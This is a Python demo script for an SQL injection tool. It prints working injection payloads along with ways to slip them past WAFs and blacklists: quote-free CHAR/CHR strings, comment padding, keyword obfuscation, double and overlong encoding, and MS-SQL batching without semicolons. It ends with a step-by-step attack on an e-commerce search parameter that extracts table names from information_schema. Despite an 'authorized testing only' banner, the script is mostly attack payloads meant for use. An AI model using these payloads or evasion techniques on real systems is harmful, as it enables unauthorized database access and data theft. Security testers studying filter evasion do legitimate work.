#!/usr/bin/env python3
"""
Demo script showcasing the advanced SQL injection bypass techniques.

This script demonstrates how the new bypass techniques can be used to
evade common SQL injection filters and blacklists.
"""

import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from sql_attacker.bypass_techniques import (
    StringConstructionBypass,
    CommentWhitespaceBypass,
    KeywordVariantBypass,
    EncodingBypass,
    BatchQueryBypass,
    AdvancedBypassEngine,
    DBMSType,
)


def print_header(title):
    """Print a formatted header"""
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def print_section(title):
    """Print a formatted section"""
    print(f"\n{title}")
    print("-" * 70)


def print_example(label, value):
    """Print an example with proper formatting"""
    print(f"\n  {label}:")
    if isinstance(value, list):
        for i, v in enumerate(value, 1):
            print(f"    {i}. {v}")
    else:
        print(f"    {value}")


def demo_string_construction():
    """Demonstrate string construction bypass techniques"""
    print_header("1. BYPASSING BLOCKED CHARACTERS")
    
    print_section("Scenario: Single quotes are blocked by the application filter")
    
    original_payload = "' OR 'admin'='admin"
    print(f"\n  Original Payload: {original_payload}")
    print("  ❌ Blocked by filter (contains single quotes)")
    
    print("\n  Solution: Construct strings using ASCII/CHAR functions\n")
    
    # Oracle
    oracle_bypass = StringConstructionBypass.string_to_chr_oracle("admin")
    print(f"  Oracle (CHR with || concatenation):")
    print(f"    {oracle_bypass}")
    
    # MS-SQL
    mssql_bypass = StringConstructionBypass.string_to_char_mssql("admin")
    print(f"\n  MS-SQL (CHAR with + concatenation):")
    print(f"    {mssql_bypass}")
    
    # MySQL
    mysql_bypass = StringConstructionBypass.string_to_char_mysql("admin")
    print(f"\n  MySQL (CHAR with comma-separated values):")
    print(f"    {mysql_bypass}")
    
    # MySQL Hex
    mysql_hex = StringConstructionBypass.string_to_hex_mysql("admin")
    print(f"\n  MySQL (Hex representation):")
    print(f"    {mysql_hex}")
    
    # Full payload bypass
    print(f"\n  Full Payload Bypass (MySQL):")
    bypassed = StringConstructionBypass.bypass_quotes_in_payload(original_payload, DBMSType.MYSQL)
    print(f"    Original: {original_payload}")
    print(f"    Bypassed: {bypassed}")
    print("  ✅ No single quotes in the bypassed payload!")


def demo_comment_whitespace():
    """Demonstrate comment-based bypass techniques"""
    print_header("2. USING SQL COMMENTS AS WHITESPACE")
    
    print_section("Scenario: Spaces are blocked or filtered")
    
    original_payload = "UNION SELECT NULL FROM users"
    print(f"\n  Original Payload: {original_payload}")
    print("  ❌ Blocked by filter (contains spaces)")
    
    print("\n  Solution: Replace spaces with inline comments\n")
    
    # Basic comment replacement
    comment_bypass = CommentWhitespaceBypass.space_to_inline_comment(original_payload)
    print(f"  Comment Replacement:")
    print(f"    {comment_bypass}")
    print("  ✅ No spaces in the payload!")
    
    # Different comment styles
    print("\n  Alternative Comment Styles:")
    styles = [
        ("Standard", "/**/"),
        ("MySQL specific", "/*!*/"),
        ("With underscore", "/*_*/"),
        ("Versioned", "/*!50000*/"),
    ]
    
    for name, style in styles:
        bypass = CommentWhitespaceBypass.space_to_inline_comment(original_payload, style)
        print(f"    {name:20} {bypass}")
    
    # Break keywords with comments (MySQL specific)
    print("\n  MySQL: Breaking Keywords with Comments")
    keyword_payload = "SELECT FROM WHERE"
    broken = CommentWhitespaceBypass.insert_comment_in_keywords(keyword_payload)
    print(f"    Original: {keyword_payload}")
    print(f"    Broken:   {broken}")
    print("  ✅ Keywords are split, may bypass keyword filters!")
    
    # Logical block injection
    print("\n  Logical Block Injection (when comments are blocked):")
    logical = CommentWhitespaceBypass.create_logical_block_injection("base")
    print(f"    {logical}")
    print("  ✅ No comment symbols, uses logical operators!")


def demo_keyword_variants():
    """Demonstrate keyword variant bypass techniques"""
    print_header("3. CIRCUMVENTING SIMPLE VALIDATIONS/BLACKLISTS")
    
    print_section("Scenario: SQL keywords are blacklisted")
    
    keyword = "SELECT"
    print(f"\n  Blocked Keyword: {keyword}")
    print("  ❌ Blocked by naive blacklist filter")
    
    print("\n  Solution: Generate keyword variants\n")
    
    # Mixed case variants
    print("  Mixed Case Variants:")
    patterns = ["alternate", "camel", "random"]
    for pattern in patterns:
        variant = KeywordVariantBypass.mixed_case_variant(keyword, pattern)
        print(f"    {pattern:15} {variant}")
    
    # Hex encoding
    print("\n  Hex Encoding:")
    full_hex = KeywordVariantBypass.hex_encode_keyword(keyword, full=True)
    partial_hex = KeywordVariantBypass.hex_encode_keyword(keyword, full=False)
    print(f"    Full encoding:    {full_hex}")
    print(f"    Partial encoding: {partial_hex}")
    
    # Keyword repetition
    print("\n  Keyword Repetition (defeats simple string replacement):")
    repeated = KeywordVariantBypass.keyword_repetition(keyword)
    print(f"    Original: {keyword}")
    print(f"    Repeated: {repeated}")
    print("    Explanation: If filter removes 'SELECT', result is still 'SELECT'")
    
    # Apply to full payload
    print("\n  Applied to Full Payload:")
    payload = "' UNION SELECT NULL"
    variants = KeywordVariantBypass.apply_to_payload(payload)
    print(f"    Original: {payload}")
    print(f"    Generated {len(variants)} variants:")
    for i, variant in enumerate(variants[:5], 1):
        print(f"      {i}. {variant}")
    if len(variants) > 5:
        print(f"      ... and {len(variants) - 5} more")


def demo_encoding_bypass():
    """Demonstrate encoding bypass techniques"""
    print_header("4. EXPLOITING DEFECTIVE FILTERS")
    
    print_section("Scenario: WAF or filter applies single-pass decoding")
    
    original_payload = "' OR 1=1--"
    print(f"\n  Original Payload: {original_payload}")
    print("  ❌ Blocked by WAF/filter after decoding")
    
    print("\n  Solution: Apply multiple encoding layers\n")
    
    # Double URL encoding
    double = EncodingBypass.double_url_encode(original_payload)
    print(f"  Double URL Encoding:")
    print(f"    {double}")
    print("    Explanation: Filter decodes once → still encoded → bypasses detection")
    
    # Partial encoding
    print("\n  Partial Encoding (50% of characters):")
    partial = EncodingBypass.partial_encode(original_payload, ratio=0.5)
    print(f"    {partial}")
    print("    Note: Random selection, run multiple times for variations")
    
    # Mixed encoding
    print("\n  Mixed Encoding (special chars only):")
    mixed = EncodingBypass.mixed_encoding(original_payload)
    print(f"    {mixed}")
    print("    Explanation: Keywords readable but special chars encoded")
    
    # Unicode encoding
    print("\n  Unicode Encoding:")
    standard = EncodingBypass.unicode_encode(original_payload, 'standard')
    print(f"    Standard: {standard}")
    
    overlong = EncodingBypass.unicode_encode(original_payload, 'overlong')
    print(f"    Overlong: {overlong}")
    print("    Explanation: Overlong UTF-8 can bypass some filters")


def demo_batch_queries():
    """Demonstrate batch query bypass"""
    print_header("5. MS-SQL BATCH QUERIES WITHOUT SEMICOLONS")
    
    print_section("Scenario: Semicolons are blocked in MS-SQL")
    
    queries = ["SELECT 1", "SELECT 2", "DROP TABLE test"]
    print("\n  Queries to Execute:")
    for i, q in enumerate(queries, 1):
        print(f"    {i}. {q}")
    
    print("\n  Traditional Approach (blocked):")
    print(f"    {'; '.join(queries)}")
    print("  ❌ Semicolons are blocked")
    
    print("\n  Solution: Alternative batch syntax\n")
    
    # Newline separation
    newline_batch = BatchQueryBypass.batch_without_semicolon(queries)
    print("  Using Newlines:")
    print(f"    {repr(newline_batch)}")
    
    # EXEC wrapper
    exec_batch = BatchQueryBypass.batch_with_exec(queries)
    print("\n  Using EXEC Wrapper:")
    print(f"    {exec_batch}")
    print("  ✅ No semicolons required!")


def demo_comprehensive_engine():
    """Demonstrate the comprehensive bypass engine"""
    print_header("6. COMPREHENSIVE BYPASS ENGINE")
    
    print_section("Scenario: Need multiple bypass techniques simultaneously")
    
    # Initialize engine for MySQL
    engine = AdvancedBypassEngine(DBMSType.MYSQL)
    original_payload = "' UNION SELECT NULL,NULL,NULL--"
    
    print(f"\n  Original Payload: {original_payload}")
    print(f"  Target DBMS: MySQL")
    print("\n  Generating comprehensive bypass variants...\n")
    
    # Generate variants
    variants = engine.generate_all_bypass_variants(original_payload, max_variants=15)
    
    print(f"  Generated {len(variants)} variants using multiple techniques:")
    print()
    
    for i, variant in enumerate(variants, 1):
        # Classify the variant
        techniques = []
        if "CHAR(" in variant:
            techniques.append("String Construction")
        if "/*" in variant:
            techniques.append("Comment Insertion")
        if "%" in variant and "%" not in original_payload:
            techniques.append("Encoding")
        if variant != original_payload and variant.upper() != original_payload.upper():
            if not techniques:
                techniques.append("Case Variation")
        
        technique_str = ", ".join(techniques) if techniques else "Original"
        print(f"    {i:2}. [{technique_str}]")
        print(f"        {variant}\n")


def demo_real_world_scenario():
    """Demonstrate a complete real-world scenario"""
    print_header("7. REAL-WORLD SCENARIO")
    
    print_section("Complete Attack Flow with Bypass Techniques")
    
    print("\n  Scenario:")
    print("    - Target: E-commerce search page")
    print("    - Parameter: ?search=<query>")
    print("    - Protections: WAF + Application filter")
    print("    - Filter blocks: Single quotes, spaces, common keywords")
    
    print("\n  Attack Strategy:\n")
    
    # Step 1: Basic payload (blocked)
    print("  Step 1: Try basic payload")
    basic = "' OR 1=1--"
    print(f"    Payload: {basic}")
    print("    Result: ❌ BLOCKED (quotes, spaces detected)")
    
    # Step 2: Apply bypasses
    print("\n  Step 2: Apply bypass techniques")
    engine = AdvancedBypassEngine(DBMSType.MYSQL)
    bypasses = engine.generate_all_bypass_variants(basic, max_variants=5)
    
    print(f"    Generated {len(bypasses)} bypass variants:")
    for i, bypass in enumerate(bypasses[:3], 1):
        print(f"      {i}. {bypass}")
    
    # Step 3: Success
    print("\n  Step 3: Successful bypass")
    successful = bypasses[2] if len(bypasses) > 2 else bypasses[1]
    print(f"    Payload: {successful}")
    print("    Result: ✅ BYPASSED - SQL error returned!")
    
    # Step 4: Exploitation
    print("\n  Step 4: Data extraction")
    extraction = "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--"
    extraction_bypass = CommentWhitespaceBypass.space_to_inline_comment(extraction)
    print(f"    Payload: {extraction_bypass}")
    print("    Result: ✅ Database tables extracted!")


def main():
    """Run all demonstrations"""
    print("\n" + "=" * 70)
    print("  SQL INJECTION BYPASS TECHNIQUES - DEMONSTRATION")
    print("=" * 70)
    print("\n  This demo showcases advanced techniques for bypassing SQL")
    print("  injection filters, WAFs, and application-level blacklists.")
    print("\n  ⚠️  FOR AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 70)
    
    try:
        demo_string_construction()
        demo_comment_whitespace()
        demo_keyword_variants()
        demo_encoding_bypass()
        demo_batch_queries()
        demo_comprehensive_engine()
        demo_real_world_scenario()
        
        print_header("SUMMARY")
        print("\n  The SQL Attacker now includes comprehensive bypass techniques:")
        print("    ✅ String construction without quotes (CHR/CHAR)")
        print("    ✅ Comment-based whitespace replacement")
        print("    ✅ Keyword obfuscation (case, hex, repetition)")
        print("    ✅ Advanced encoding (double, partial, unicode)")
        print("    ✅ MS-SQL batch queries without semicolons")
        print("    ✅ Comprehensive bypass engine")
        print("\n  These techniques are automatically integrated into the")
        print("  SQL injection attack loop for maximum effectiveness.")
        print("\n  See BYPASS_TECHNIQUES_GUIDE.md for complete documentation.")
        print("\n" + "=" * 70 + "\n")
        
        return 0
        
    except Exception as e:
        print(f"\n❌ ERROR: {e}\n")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
